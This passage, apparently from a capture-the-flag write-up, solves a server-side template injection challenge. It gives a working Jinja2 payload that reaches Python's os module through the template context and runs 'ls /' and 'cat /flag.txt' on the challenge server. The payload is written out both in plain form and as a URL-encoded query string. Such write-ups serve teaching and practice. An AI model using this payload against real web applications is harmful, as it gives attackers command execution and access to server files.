...
The flag is present in the root (confirm using payload ```\{\{ self._TemplateReference__context.cycler.\__init__.\__globals\__[\'os\'].popen('ls /').read() \}\}``` ). \
We can get the flag using 
```
https://babyssti.crhc.club/dms?key=\{\{%20self._TemplateReference__context.cycler.__init__.__globals__[%27os%27].popen(%27cat%20/flag.txt%27).read()%20\}\}
```
